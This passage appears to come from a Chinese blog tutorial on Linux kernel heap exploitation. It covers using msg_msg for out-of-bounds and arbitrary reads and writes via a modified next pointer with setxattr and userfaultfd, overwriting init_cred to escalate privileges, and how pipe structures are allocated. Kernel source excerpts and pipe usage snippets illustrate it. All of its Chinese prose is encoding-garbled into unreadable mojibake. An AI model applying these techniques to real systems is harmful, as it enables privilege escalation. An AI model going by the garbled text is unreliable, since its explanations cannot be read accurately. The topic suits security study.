          <a href="#C-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#C-æ•°æ®å¤åˆ¶" class="headerlink" title="C.æ•°æ®å¤åˆ¶"></a>C.æ•°æ®å¤åˆ¶</h5>
      <p>ä¸ç®¡ä»€ä¹ˆæ ‡å¿—ä½ï¼Œåªè¦ä¸æ˜¯<code>MSG_NOERROR</code>å’Œ<code>MSG_COPY</code>è”åˆèµ·æ¥ï¼Œå¹¶ä¸”ç”³è¯·è¯»å–æ¶ˆæ¯é•¿åº¦<code>size</code>å°äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„å®é™…æ¶ˆæ¯çš„<code>m_ts</code>ï¼Œé‚£ä¹ˆæœ€ç»ˆéƒ½ä¼šèµ°åˆ°do_msgrcv()å‡½æ•°çš„æœ«å°¾ï¼Œé€šè¿‡å¦‚ä¸‹ä»£ç è¿›è¡Œæ•°æ®å¤åˆ¶å’Œå †å—é‡Šæ”¾</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨"   >
          <a href="#3-åˆ©ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨" class="headerlink" title="(3)åˆ©ç”¨"></a>(3)åˆ©ç”¨</h3>
      
        <h4 id="è¶Šç•Œè¯»å–"   >
          <a href="#è¶Šç•Œè¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#è¶Šç•Œè¯»å–" class="headerlink" title="è¶Šç•Œè¯»å–"></a>è¶Šç•Œè¯»å–</h4>
      <p>è¿™æ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ä¹‹å‰æåˆ°çš„<code>double-free/UAF</code>ï¼Œå¹¶ä¸”å†ä½¿ç”¨<code>setxattr</code>æ¥å¯¹<code>msg_msgmsg</code>ä¸­çš„<code>m_ts</code>è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨<code>msgrcv</code>çš„æ—¶å€™å°±èƒ½è¶Šç•Œä»å †ä¸Šè¯»å–å†…å­˜äº†ï¼Œå°±å¯èƒ½èƒ½å¤Ÿæ³„éœ²åˆ°å †åœ°å€æˆ–è€…ç¨‹åºåŸºåœ°å€ã€‚</p>
<p><strong>ä½¿ç”¨<code>setxattr</code>çš„æ—¶å€™éœ€è¦æ³¨æ„é‡Šæ”¾å †å—æ—¶FDçš„ä½ç½®ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¼€å¯ä¸åŒä¿æŠ¤ä¸‹FDçš„ä½ç½®ä¸å¤ªä¸€æ ·</strong></p>
<p>ä¸ºäº†è·å–åˆ°åœ°å€çš„æˆåŠŸæ€§æ›´å¤§ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å•ä¸ª<code>msg_queue</code>å’Œå•ä¸ª<code>msg_msg</code>çš„å†…å­˜æ¨¡å‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png" alt="image-20220511113542467"></p>
<p>å¯ä»¥çœ‹åˆ°å•ä¸ª<code>msg_msg</code>åœ¨<code>msg_queue</code>çš„ç®¡ç†ä¸‹å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡<code>msgget</code>å’Œ<code>msgsnd</code>å¤šç”³è¯·ä¸€äº›ç›¸åŒå¤§å°çš„ä¸”åªæœ‰ä¸€ä¸ª<code>msg_msg</code>ç»“æ„ä½“çš„<code>msg_queue</code>ï¼Œé‚£ä¹ˆè¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¯»å–åˆ°åªæœ‰å•ä¸ª<code>msg_msg</code>çš„å¤´éƒ¨äº†</p>
<p>è€Œå•ä¸ª<code>msg_msg</code>ç”±äºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå…¶å¤´éƒ¨ä¸­åˆå­˜åœ¨æŒ‡å‘<code>msg_queue</code>çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½æ³„éœ²å‡º<code>msg_queue</code>çš„å †åœ°å€äº†ã€‚</p>

        <h4 id="ä»»æ„è¯»å–"   >
          <a href="#ä»»æ„è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„è¯»å–" class="headerlink" title="ä»»æ„è¯»å–"></a>ä»»æ„è¯»å–</h4>
      <p>å®Œæˆä¸Šè¿°æ³„éœ²<code>msg_queue</code>çš„å †åœ°å€ä¹‹åï¼Œå°±éœ€è¦ç”¨åˆ°<code>msg_msg</code>çš„å†…å­˜å¸ƒå±€äº†</p>
<p>ç”±äºæˆ‘ä»¬çš„<code>msg_msg</code>æ¶ˆæ¯çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png" alt="5IcVxRaFQtg3HCW"></p>
<p>ç›¸å…³è¯»å–æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.9----ipc/msgutil.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">store_msg</span><span class="params">(<span class="keyword">void</span> __user *dest, struct msg_msg *msg, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">		len -= alen;</span><br><span class="line">		dest = (<span class="keyword">char</span> __user *)dest + alen;</span><br><span class="line">		alen = min(len, DATALEN_SEG);</span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹<code>next</code>æŒ‡é’ˆå’Œ<code>m_ts</code>ï¼Œç»“åˆè¯»å–<code>msg</code>æœ€ç»ˆè°ƒç”¨å‡½æ•°<code>store_msg</code>çš„æºç ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå®ç°ä»»æ„è¯»å–ã€‚</p>
<p>é‚£ä¹ˆæ¥ç€ä¸Šé¢çš„ï¼Œæˆ‘ä»¬å¾—åˆ°<code>msg_queue</code>ä¹‹åï¼Œå¯ä»¥å†å°†<code>msg_msg</code>çš„nextæŒ‡é’ˆæŒ‡å›<code>msg_queue</code>ï¼Œè¯»å‡ºå…¶ä¸­çš„<code>msg_msg</code>ï¼Œå°±èƒ½è·å¾—å½“å‰å¯æ§å †å—çš„å †åœ°å€ã€‚</p>
<p>è¿™æ ·å®Œæˆä¹‹åï¼Œæˆ‘ä»¬ç»“åˆ<code>userfaultfd</code>å’Œ<code>setxattr</code>é¢‘ç¹ä¿®æ”¹nextæŒ‡é’ˆå°±èƒ½åŸºäºå½“å‰å †åœ°å€æ¥è¿›è¡Œå†…å­˜æœç´¢äº†ï¼Œä»è€Œèƒ½å¤Ÿå®Œæˆåœ°å€æ³„éœ²ã€‚</p>
<p>åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ¤æ–­é“¾è¡¨æ˜¯å¦ç»“æŸçš„ä¾æ®ä¸ºnextæ˜¯å¦ä¸ºnullï¼Œæ‰€ä»¥æˆ‘ä»¬ä»»æ„è¯»å–çš„æ—¶å€™ï¼Œæœ€å¥½æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹çš„nextæŒ‡é’ˆå¤„çš„å€¼ä¸ºnullã€‚</p>

        <h4 id="ä»»æ„å†™"   >
          <a href="#ä»»æ„å†™" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»»æ„å†™" class="headerlink" title="ä»»æ„å†™"></a>ä»»æ„å†™</h4>
      <p>åŒæ ·çš„ï¼Œ<code>msg_msg</code>ç”±äºnextæŒ‡é’ˆçš„å­˜åœ¨ï¼Œç»“åˆ<code>msgsnd</code>ä¹Ÿå…·å¤‡ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‹·è´çš„æ—¶å€™åˆ©ç”¨<code>userfaultfd</code>åœä¸‹æ¥ï¼Œç„¶åæ›´æ”¹nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚<code>init_cred</code>ç»“æ„ä½“ä½ç½®ï¼Œä»è€Œç›´æ¥ä¿®æ”¹è¿›è¡Œææƒã€‚</p>

        <h2 id="2-pipeç®¡é“â€”kmalloc-1024-kmalloc-192"   >
          <a href="#2-pipeç®¡é“â€”kmalloc-1024-kmalloc-192" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-pipeç®¡é“â€”kmalloc-1024-kmalloc-192" class="headerlink" title="2.pipeç®¡é“â€”kmalloc-1024/kmalloc-192"></a>2.pipeç®¡é“â€”kmalloc-1024/kmalloc-192</h2>
      <p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/116270704" >(31æ¡æ¶ˆæ¯) Linuxç³»ç»Ÿè°ƒç”¨ï¼špipe()ç³»ç»Ÿè°ƒç”¨æºç åˆ†æ_rtoaxçš„åšå®¢-CSDNåšå®¢_linux pipe æºç </a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>****</p>
<p>é€šå¸¸æ¥è®²ï¼Œç®¡é“ç”¨æ¥åœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´é€šä¿¡ï¼Œå› ä¸º<code>fork</code>å‡ºæ¥çš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦å‰¯æœ¬ã€‚è¿™é‡Œå°±ä½¿ç”¨å½“å‰è¿›ç¨‹æ¥åˆ›å»ºç®¡é“ç¬¦ï¼Œä»ç®¡é“çš„è¯»å–ç«¯(<code>pipe_fd[0]</code>)å’Œå†™å…¥ç«¯(<code>pipe_fd[1]</code>)æ¥è¿›è¡Œåˆ©ç”¨ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•-1"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•-1" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º-2"   >
          <a href="#â‘ åˆ›å»º-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-2" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä½¿ç”¨pipeæˆ–è€…pipe2</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipe_fd);<span class="comment">//é»˜è®¤é˜»å¡çŠ¶æ€</span></span><br><span class="line"><span class="comment">//pipe2(pipe_fd,flag);</span></span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­<code>pipe2</code>å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨<code>__NR_pipe2</code>çš„<code>flag</code>æ”¯æŒé™¤0ä¹‹å¤–çš„ä¸‰ç§æ¨¡å¼ï¼Œå¯ç”¨åœ¨<code>man</code>æ‰‹å†Œä¸­æŸ¥çœ‹ã€‚</p>
<p>å¦‚æœä¼ å…¥çš„<code>flag</code>ä¸º0ï¼Œåˆ™å’Œ<code>pipe</code>å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œæ˜¯é˜»å¡çš„ã€‚</p>
<p>é˜»å¡çŠ¶æ€ï¼šå³å½“æ²¡æœ‰æ•°æ®åœ¨ç®¡é“ä¸­æ—¶ï¼Œå¦‚æœè¿˜è°ƒç”¨<code>read</code>ä»ç®¡é“è¯»å–æ•°æ®ï¼Œé‚£ä¹ˆå°±ä¼šä½¿å¾—ç¨‹åºå¤„äºé˜»å¡çŠ¶æ€ï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„æƒ…å†µã€‚</p>
<p>ä¼šé»˜è®¤åˆ›å»ºä¸¤ä¸ªfdæ–‡ä»¶æè¿°ç¬¦çš„ï¼Œè¯¥fdæ–‡ä»¶æè¿°ç¬¦æ•ˆæœçš„ç›¸å…³ç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">	.open		= fifo_open,</span><br><span class="line">	.llseek		= no_llseek,</span><br><span class="line">	.read_iter	= pipe_read,</span><br><span class="line">	.write_iter	= pipe_write,</span><br><span class="line">	.poll		= pipe_poll,</span><br><span class="line">	.unlocked_ioctl	= pipe_ioctl,</span><br><span class="line">	.release	= pipe_release,</span><br><span class="line">	.fasync		= pipe_fasync,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ”¾å…¥åˆ°<code>pipe_fd</code>ä¸­ï¼Œå¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[0]:%d\n&quot;</span>,pipe_fd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;pipe_fd[1]:%d\n&quot;</span>,pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png" alt="image-20220509161948796"></p>
<p>ä¹‹åä½¿ç”¨<code>write/read</code>æ¥å†™å…¥è¯»å–å³å¯ï¼Œæ³¨æ„å†™å…¥ç«¯ä¸º<code>fd[1]</code>ï¼Œè¯»å–ç«¯ä¸º<code>fd[0]</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(pipe_fd[<span class="number">1</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(pipe_fd[<span class="number">0</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-1"   >
          <a href="#â‘¡é‡Šæ”¾-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-1" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç”±äº<code>pipe</code>ç®¡é“åˆ›å»ºåä¼šå¯¹åº”åˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥é‡Šæ”¾ä¸¤ç«¯å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å³å¯é‡Šæ”¾ç®¡é“<code>pipe</code>ç®¡é“</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">close(pipe_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦å°†ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦fdéƒ½ç»™é‡Šæ”¾æ‰æˆ–è€…ä½¿ç”¨<code>read</code>å°†ç®¡é“ä¸­æ‰€æœ‰æ•°æ®éƒ½è¯»å–å‡ºæ¥ï¼Œæ‰ä¼šè¿›å…¥<code>free_pipe_info</code>å‡½æ•°æ¥é‡Šæ”¾åœ¨çº¿æ€§æ˜ å°„åŒºåŸŸç”³è¯·çš„ç›¸å…³å†…å­˜èµ„æºï¼Œå¦åˆ™è¿˜æ˜¯ä¸ä¼šè¿›å…¥çš„ã€‚</p>

        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-1" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      
        <h4 id="â‘ åˆ†é…"   >
          <a href="#â‘ åˆ†é…" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†é…" class="headerlink" title="â‘ åˆ†é…"></a>â‘ åˆ†é…</h4>
      <p>å‘ç”Ÿåœ¨è°ƒç”¨<code>pipe</code>/<code>pipe2</code>å‡½æ•°ï¼Œæˆ–è€…ç³»ç»Ÿè°ƒç”¨<code>__NR_pipe</code>/<code>__NR_pipe2</code>æ—¶ï¼Œå†…æ ¸å…¥å£ä¸º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE1(pipe, <span class="keyword">int</span> __user *, fildes) <span class="comment">/* pipe() ç³»ç»Ÿè°ƒç”¨ */</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> do_pipe2(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()-&gt;__do_pipe_flags()-&gt;create_pipe_files()-&gt;get_pipe_inode()-&gt;alloc_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>è°ƒç”¨ä¹‹åä¼šåœ¨å†…æ ¸çš„çº¿æ€§æ˜ å°„åŒºåŸŸè¿›è¡Œå†…å­˜åˆ†é…ï¼Œä¹Ÿå°±æ˜¯å¸¸è§çš„å†…æ ¸å †ç®¡ç†çš„åŒºåŸŸã€‚åˆ†é…ç‚¹åœ¨å¦‚ä¸‹å‡½æ•°ä¸­ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function">struct pipe_inode_info *<span class="title">alloc_pipe_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//#define PIPE_DEF_BUFFERS	16</span></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//pipe_inode_infoç®¡ç†ç»“æ„ï¼Œå¤§å°ä¸º0xa0ï¼Œå±äºkmalloc-192</span></span><br><span class="line">	pipe = kzalloc(<span class="keyword">sizeof</span>(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (pipe == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_free_uid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//ç›¸å…³çš„æ¶ˆæ¯ç»“æ„ä¸ºpipe_bufferæ•°ç»„,æ€»å…±16*0x28=0x280,ç›´æ¥ä»kmalloc-1024ä¸­æ‹¿å–å †å—</span></span><br><span class="line">	pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(struct pipe_buffer),</span><br><span class="line">			     GFP_KERNEL_ACCOUNT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">	<span class="comment">//å¯¹ç”³è¯·çš„pipeç®¡é“è¿›è¡Œä¸€äº›åˆå§‹åŒ–</span></span><br><span class="line">	<span class="keyword">if</span> (pipe-&gt;bufs) &#123;</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class="line">		init_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class="line">		pipe-&gt;r_counter = pipe-&gt;w_counter = <span class="number">1</span>;</span><br><span class="line">		pipe-&gt;max_usage = pipe_bufs;</span><br><span class="line">		pipe-&gt;ring_size = pipe_bufs;</span><br><span class="line">		pipe-&gt;nr_accounted = pipe_bufs;</span><br><span class="line">		pipe-&gt;user = user;</span><br><span class="line">		mutex_init(&amp;pipe-&gt;mutex);</span><br><span class="line">		<span class="keyword">return</span> pipe;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//å‡ºé”™çš„è¯åˆ™ä¼šé‡Šæ”¾æ‰ï¼Œå…·ä½“å¹²å•¥çš„ä¸å¤ªæ¸…æ¥š</span></span><br><span class="line">out_free_uid:</span><br><span class="line">	free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³çš„<code>pipe_inode_info</code>ç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;<span class="comment">//æ–‡ä»¶æè¿°ç¬¦è®¡æ•°ï¼Œéƒ½ä¸º0æ—¶æ‰ä¼šé‡Šæ”¾ç®¡é“</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="comment">//pipe_bufferæ•°ç»„,16ä¸ª,æ¯ä¸ªå¤§å°ä¸º0xa0,é€šå¸¸æˆ‘ä»¬ä»è¿™ä¸Šé¢æ³„éœ²åœ°å€æˆ–è€…åŠ«æŒç¨‹åºæµ</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-2"   >
